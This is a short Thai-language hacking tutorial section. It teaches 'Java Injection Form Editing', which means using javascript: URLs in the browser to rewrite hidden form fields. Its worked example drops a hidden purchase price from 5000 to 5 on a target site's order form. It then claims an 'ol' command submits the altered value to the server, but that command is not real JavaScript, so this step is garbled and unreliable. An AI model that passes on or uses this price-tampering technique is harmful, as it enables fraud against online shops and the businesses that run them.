III. Java Injection Form Editing

        ทำได้โดย ใช้คำสั่ง

javascript:void(document.forms[x].field.value="you want");alert(document.forms[x].field.value)

        forms[x] ค่า x คือลำดับของ form ที่จะ Edit โดยเริ่มจากศูนย์ ส่วน Field นั้นเป็นชื่อ Field ที่ต้องการ Edit ส่วนคำสั่ง alert นั้นเพื่อดูว่าค่า Hidden Field ที่เราเปลี่ยนไปนั้นได้ผลหรือไม่

<form name="form2" method="post" action="เป้าหมายที่ต้องการ">

<input name="price" type="hidden" id="price" value="5000">
<span class="style2">ซื้อจำนวน</span>
<input name="textfield" type="text" size="16" maxlength="16" >
<span class="style2">ตัว</span>
<input type="submit" name="Submit" value="Submit">

</form>

javascript:void(document.forms[0].price.value="5");alert(document.forms[0].price.value)

จากตัวอย่างเป็นการเปลี่ยน hidden field ที่มีชื่อว่า price ให้มีค่าเป็น 5 โดยเป็น form แรก forms[x] จึงมีค่าเป็น 0 แต่ในขั้นแรกนี้เป็นการเปลี่ยนค่าภายในเครื่องของเราเท่านั้นเอง ซึ่งจะไม่มีประโยชน์หากเราไม่ส่งไป Run บน Server ซึ่งขั้นต่อไป คือการส่งค่าที่เปลี่ยนไปทำงานบน Server โดยใช้คำสั่งต่อไปนี้
javascript:void(document.forms[x].field.value="ค่าใหม่");ol(document.forms[x].field.value="ค่าใหม่")
หรือ
javascript:void(document.forms[x]. field.value=" ค่าใหม");ol('document.forms[x]. field.value="ค่าใหม" webserver.php')
คำสั่งแรกนั้นได้อธิบายไว้แล้วในตอนแรก ส่วนคำสั่ง ol นั้นเป็นคำสั่งที่ใช้ส่งค่าที่เปลี่ยนไปทำงานบน Server
